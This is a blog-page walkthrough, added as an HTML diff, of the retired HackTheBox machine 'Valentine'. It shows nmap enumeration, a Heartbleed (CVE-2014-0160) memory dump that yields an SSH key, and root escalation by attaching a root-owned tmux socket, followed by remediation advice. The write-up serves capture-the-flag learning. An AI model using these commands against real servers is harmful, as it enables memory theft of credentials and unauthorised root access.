@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Valentine: Heartbleed memory theft and a root tmux session — Lucky Thandel</title>
+<meta name="description" content="Bleed an old OpenSSL heartbeat (CVE-2014-0160) for an SSH key and passphrase, then attach a root-owned tmux session left lying around. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-10 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Valentine: Heartbleed memory theft and a root tmux session</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Valentine is a retired HackTheBox easy Linux machine built from two famous leftovers. Synopsis: a Heartbleed-vulnerable HTTPS service (CVE-2014-0160) leaking an SSH key and passphrase, then a root tmux session on a world-accessible socket.</p>
+<h2><span class="amber">$</span> Enumeration — old TLS</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: fingerprint the TLS stack</span>
+nmap -sC -sV -oN valentine.nmap 10.10.10.79
+nmap --script ssl-heartbleed -p 443 10.10.10.79</pre>
+<p>HTTP/HTTPS on an older Linux; the certificate and old OpenSSL version string point at Heartbleed before any exploit runs — confirmed by the ssl-heartbleed script.</p>
+<h2><span class="amber">$</span> Foothold — Heartbleed memory theft</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: bleed, grep, SSH as hype</span>
+python3 heartbleed.py 10.10.10.79 -p 443 &gt; dump.bin   # repeat several times
+strings dump.bin | grep -i -A2 -B2 &quot;BEGIN.*PRIVATE KEY&quot;
+chmod 600 hype_key
+ssh -i hype_key hype@10.10.10.79   # passphrase from the same dumps</pre>
+<p>Sift the leaked 64KB chunks: among the garbage sit an SSH private key and its passphrase in the clear. Save with strict permissions (SSH refuses readable-by-others keys) and log in as hype. Memory-disclosure bugs turn the server into an oracle.</p>
+<h2><span class="amber">$</span> Privilege escalation — root tmux socket</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: attach the abandoned root session</span>
+ls -la /tmp/*.sess /var/tmux* 2&gt;/dev/null; tmux ls
+tmux -S &lt;root-owned-socket&gt; attach
+id   # uid=0(root)</pre>
+<p>A tmux socket owned by root that your user can attach to holds a live root shell someone left running — attach and you are root with no exploit at all. Sockets are permissions too. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Bleeding once and giving up (key material spreads across dumps — collect several and grep) and mis-setting key file permissions.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch OpenSSL past Heartbleed everywhere, rotate credentials that lived in process memory, and kill idle privileged sessions automatically. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
